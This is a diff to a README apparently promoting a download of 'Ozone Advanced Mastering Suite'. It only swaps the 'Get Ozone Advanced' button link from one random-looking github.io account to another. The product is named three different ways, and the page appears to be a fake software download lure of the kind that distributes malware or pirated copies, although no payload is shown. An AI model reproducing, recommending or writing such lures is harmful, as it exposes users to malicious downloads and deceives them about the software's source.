@@ -21,7 +21,7 @@ To begin using this **Ozone Advanced Mastering Suite** and **Ozone Advanced Maxi
 | :--- | :--- |
 | **Get Ozone Advanced Mastering Suite** | Click the button below to start using this **Ozone Advanced Spectral Shaper**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_Ozone_Advanced-2ea44f?style=for-the-badge)](https://derrickmaciasspnc.github.io/.github/ozone-advanced-mastering-suite)
+[![Button](https://img.shields.io/badge/🎛️-Get_Ozone_Advanced-2ea44f?style=for-the-badge)](https://luisschroederdrbf.github.io/.github/ozone-advanced-mastering-suite)
 
 ## System Requirements
 
